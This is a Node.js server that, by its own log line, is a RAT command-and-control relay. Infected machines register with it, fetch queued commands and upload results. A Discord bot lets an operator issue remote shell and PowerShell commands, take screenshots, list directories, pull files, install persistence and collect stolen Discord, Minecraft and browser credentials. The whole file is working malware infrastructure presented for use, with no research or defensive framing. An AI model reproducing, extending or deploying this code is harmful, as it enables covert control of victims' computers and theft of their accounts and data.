const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// In-memory storage
const agents = new Map();
const responses = new Map(); // agent_id -> [responses]
const commands = new Map();  // agent_id -> [{id, data, pending}]

// Discord bot state
const bot = {
    token: null,
    channelId: null,
    prefix: '!',
    running: false,
    lastSeenId: null,
    lastError: null,
    username: null,
};

// ================= helpers =================

async function discord(path, opts = {}) {
    if (!bot.token) throw new Error('bot token not configured');
    const res = await fetch(`https://discord.com/api/v10${path}`, {
        ...opts,
        headers: {
            Authorization: `Bot ${bot.token}`,
            'Content-Type': 'application/json',
            ...(opts.headers || {}),
        },
    });
    if (res.status === 401) throw new Error('invalid bot token');
    if (!res.ok) throw new Error(`discord api ${res.status}`);
    return res.json();
}

function agentList() {
    const now = Date.now();
    return Array.from(agents.values()).map(a => {
        const age = (now - new Date(a.last_seen).getTime()) / 1000;
        return { ...a, status: age < 30 ? 'Online' : 'Offline' };
    });
}

function fmtAgent(agentId) {
    const a = agents.get(agentId);
    if (!a) return 'unknown host';
    return `${a.username}@${a.hostname}`;
}

// ================= health =================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        agents: agents.size,
        bot: bot.running ? 'connected' : bot.token ? 'stopped' : 'not configured',
    });
});

// ================= agents =================

app.post('/api/register', (req, res) => {
    const info = req.body;
    const id = info.id || uuidv4();

    for (const [existingId, agent] of agents.entries()) {
        if (existingId !== id &&
            agent.hostname === info.hostname &&
            agent.username === info.username) {
            agents.delete(existingId);
            responses.delete(existingId);
            commands.delete(existingId);
            console.log(`[PRUNE] removed stale session ${existingId} (${info.username}@${info.hostname})`);
        }
    }

    agents.set(id, { ...info, id, last_seen: new Date().toISOString() });
    console.log(`[REGISTER] ${info.username}@${info.hostname} (${id})`);
    res.json({ success: true, id });
});

app.post('/api/data/:agentId', (req, res) => {
    const { agentId } = req.params;
    const data = req.body;

    if (!responses.has(agentId)) responses.set(agentId, []);
    const arr = responses.get(agentId);
    arr.push({ ...data, timestamp: new Date().toISOString() });
    if (arr.length > 100) arr.shift();

    if (agents.has(agentId)) {
        agents.get(agentId).last_seen = new Date().toISOString();
    }

    console.log(`[DATA] ${data.type} from ${agentId}`);
    res.json({ success: true });
});

app.get('/api/data/:agentId', (req, res) => {
    res.json(responses.get(req.params.agentId) || []);
});

app.get('/api/agents', (req, res) => {
    res.json(agentList());
});

app.post('/api/command/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmd = req.body;
    const cmdId = uuidv4();

    if (!commands.has(agentId)) commands.set(agentId, []);
    commands.get(agentId).push({
        id: cmdId, data: cmd, pending: true, timestamp: new Date().toISOString(),
    });

    console.log(`[COMMAND] ${cmd.type} -> ${agentId} (${cmdId})`);
    res.json({ success: true, id: cmdId });
});

app.get('/api/commands/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmds = commands.get(agentId) || [];
    const pending = cmds.filter(c => c.pending);
    cmds.forEach(c => { c.pending = false; });
    res.json(pending.map(c => c.data));
});

app.get('/api/command-status/:agentId', (req, res) => {
    const cmds = commands.get(req.params.agentId) || [];
    res.json(cmds.map(c => ({ id: c.id, type: c.data.type, pending: c.pending, timestamp: c.timestamp })));
});

// ================= discord bot =================

app.post('/api/bot/config', async (req, res) => {
    const { token, channelId, prefix } = req.body || {};

    if (token === null && channelId === null) {
        // clear
        bot.token = null;
        bot.channelId = null;
        bot.running = false;
        return res.json({ success: true, configured: false });
    }

    if (token) bot.token = token.trim();
    if (channelId !== undefined && channelId !== null) {
        bot.channelId = String(channelId).trim();
    }
    if (prefix) bot.prefix = prefix;

    if (!bot.token || !bot.channelId) {
        return res.status(400).json({ success: false, error: 'token and channelId required' });
    }

    try {
        const me = await discord('/users/@me');
        bot.username = me.username;
        // verify channel access
        await discord(`/channels/${bot.channelId}`);
        bot.lastError = null;
        startBotLoop();
        res.json({ success: true, configured: true, username: me.username });
    } catch (e) {
        bot.lastError = e.message;
        res.status(400).json({ success: false, error: e.message });
    }
});

app.get('/api/bot/status', (req, res) => {
    res.json({
        configured: !!(bot.token && bot.channelId),
        running: bot.running,
        username: bot.username,
        channelId: bot.channelId,
        prefix: bot.prefix,
        lastError: bot.lastError,
    });
});

/// Post a message to the configured channel.
app.post('/api/bot/notify', async (req, res) => {
    const { content, embeds } = req.body || {};
    try {
        await discord(`/channels/${bot.channelId}/messages`, {
            method: 'POST',
            body: JSON.stringify({
                content: String(content || '').slice(0, 1900),
                embeds: embeds || undefined,
            }),
        });
        res.json({ success: true });
    } catch (e) {
        res.status(400).json({ success: false, error: e.message });
    }
});

/// Agent registry snapshot the bot renders in its status message.
app.get('/api/bot/agents', (req, res) => {
    res.json(agentList());
});

function chunk(s, n) {
    const out = [];
    for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
    return out;
}

/// Compact summary of the newest payload of a given type for an agent.
function summarize(agentId, type) {
    const arr = responses.get(agentId) || [];
    for (let i = arr.length - 1; i >= 0; i--) {
        if (arr[i].type === type) return arr[i];
    }
    return null;
}

function renderOutput(type, msg) {
    if (!msg) return '_(no response yet)_';
    if (type === 'shell_result') {
        return '```' + chunk((msg.stdout || '') + (msg.stderr || ''), 1800).join('\n```\n```') + '```';
    }
    if (type === 'screenshot_data') return '📸 screenshot captured (' + (msg.data ? msg.data.length : 0) + ' b64 chars)';
    if (type === 'dir_listing') return '```' + chunk((msg.entries || []).map(e => (e.is_dir ? '[D] ' : '    ') + e.name).join('\n'), 1800).join('\n```\n```') + '```';
    if (type === 'file_data') return '📄 file: ' + msg.path;
    if (type === 'system_info_data') return '```' + chunk(JSON.stringify(msg.info, null, 1), 1800).join('\n```\n```') + '```';
    if (type === 'credentials_data') {
        const d = msg.data || {};
        const n = (a) => (Array.isArray(a) ? a.length : 0);
        return [
            '🔑 **credentials**',
            `discord: ${n(d.discord)}`,
            `minecraft: ${n(d.minecraft)}`,
            `browser: ${n(d.browsers)}`,
        ].join('\n');
    }
    if (type === 'error') return '❌ ' + msg.message;
    return '```' + chunk(JSON.stringify(msg, null, 1), 1800).join('\n```\n```') + '```';
}

/// Map a Discord command to a C2 command.
function parseCommand(text) {
    const p = bot.prefix;
    if (!text.startsWith(p)) return null;

    const body = text.slice(p.length).trim();
    const [cmd, ...rest] = body.split(/\s+/);
    const arg = rest.join(' ');
    const c = cmd.toLowerCase();

    // "<agentId> shell <command>"
    const agentMatch = [...agents.keys()].find(id => body.startsWith(id));
    const target = agentMatch || [...agents.keys()].find(() => true);

    switch (c) {
        case 'agents':
            return { special: 'agents' };
        case 'help':
            return { special: 'help' };
        case 'ping':
            return { special: 'ping' };
    }

    if (!target) return { special: 'error', text: 'no agents registered' };

    let sub = c;
    let args = arg;
    if (agentMatch) {
        const after = body.slice(agentMatch.length).trim();
        const [s, ...r] = after.split(/\s+/);
        sub = s.toLowerCase();
        args = r.join(' ');
    }

    switch (sub) {
        case 'shell':
        case 'cmd':
            return { agent: target, cmd: { type: 'shell', cmd: args, shell: 'cmd' } };
        case 'ps':
            return { agent: target, cmd: { type: 'shell', cmd: 'powershell -NoProfile -Command "' + args + '"', shell: 'cmd' } };
        case 'screenshot':
            return { agent: target, cmd: { type: 'screenshot' } };
        case 'info':
        case 'sysinfo':
            return { agent: target, cmd: { type: 'system_info' } };
        case 'creds':
        case 'credentials':
            return { agent: target, cmd: { type: 'collect_credentials' } };
        case 'ls':
            return { agent: target, cmd: { type: 'list_dir', path: args || 'C:\\' } };
        case 'get':
            return { agent: target, cmd: { type: 'upload', path: args } };
        case 'persist':
            return { agent: target, cmd: { type: 'persist' } };
        case 'exit':
            return { agent: target, cmd: { type: 'exit' } };
        default:
            return { special: 'error', text: 'unknown command: ' + sub };
    }
}

async function sendMsg(content, embeds) {
    await discord(`/channels/${bot.channelId}/messages`, {
        method: 'POST',
        body: JSON.stringify({ content, embeds: embeds || undefined }),
    });
}

async function handleText(text) {
    const parsed = parseCommand(text);
    if (!parsed) return;

    if (parsed.special) {
        if (parsed.special === 'agents') {
            const list = agentList();
            const lines = list.map((a, i) =>
                `${i + 1}. \`${a.id.slice(0, 8)}\` ${a.username}@${a.hostname} — ${a.status}`);
            await sendMsg(list.length ? '**agents**\n' + lines.join('\n') : '_no agents_');
        } else if (parsed.special === 'help') {
            await sendMsg(
                '**commands**\n' +
                `\`${bot.prefix}agents\` list\n` +
                `\`${bot.prefix}<agentId> shell <cmd>\`\n` +
                `\`${bot.prefix}<agentId> ps <cmd>\` powershell\n` +
                `\`${bot.prefix}<agentId> screenshot\`\n` +
                `\`${bot.prefix}<agentId> info\` system info\n` +
                `\`${bot.prefix}<agentId> creds\` credentials\n` +
                `\`${bot.prefix}<agentId> ls [path]\` directory\n` +
                `\`${bot.prefix}<agentId> get <path>\` download file\n` +
                `\`${bot.prefix}<agentId> persist\` install persistence\n` +
                `\`${botPrefixFallback()}ping\` check relay`
            );
        } else if (parsed.special === 'ping') {
            await sendMsg(`pong — ${agents.size} agent(s)`);
        } else if (parsed.special === 'error') {
            await sendMsg('❌ ' + parsed.text);
        }
        return;
    }

    if (!parsed.agent) return;

    const id = uuidv4();
    if (!commands.has(parsed.agent)) commands.set(parsed.agent, []);
    commands.get(parsed.agent).push({
        id, data: parsed.cmd, pending: true, timestamp: new Date().toISOString(),
    });

    // wait for the client to answer, then post the result
    const started = Date.now();
    const poll = setInterval(async () => {
        try {
            if (Date.now() - started > 90000) {
                clearInterval(poll);
                await sendMsg(`⏱ timed out: ${fmtAgent(parsed.agent)}`);
                return;
            }
            const msg = summarize(parsed.agent, parsed.cmd.type === 'shell' ? 'shell_result' : parsed.cmd.type);
            if (msg && new Date(msg.timestamp).getTime() > started) {
                clearInterval(poll);
                await sendMsg(`**${fmtAgent(parsed.agent)}** · ${parsed.cmd.type}\n${renderOutput(parsed.cmd.type, msg)}`);
            }
        } catch (e) {
            clearInterval(poll);
            try { await sendMsg('❌ ' + e.message); } catch {}
        }
    }, 2500);
}

function botPrefixFallback() { return bot.prefix; }

async function botLoop() {
    while (bot.running) {
        try {
            const url = `/channels/${bot.channelId}/messages?limit=25`;
            const msgs = await discord(url);

            for (const m of msgs.reverse()) {
                if (m.author.bot) continue;
                if (bot.lastSeenId && m.id <= bot.lastSeenId) continue;
                bot.lastSeenId = m.id;
                if (m.content) await handleText(m.content);
            }
        } catch (e) {
            if (String(e.message).includes('invalid bot token')) {
                bot.running = false;
                bot.lastError = e.message;
                break;
            }
            bot.lastError = e.message;
        }
        await new Promise(r => setTimeout(r, 4000));
    }
}

function startBotLoop() {
    if (bot.running) return;
    bot.running = true;
    botLoop();
    console.log(`[BOT] started on channel ${bot.channelId}`);
}

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`RAT C2 Relay listening on port ${PORT}`);
});
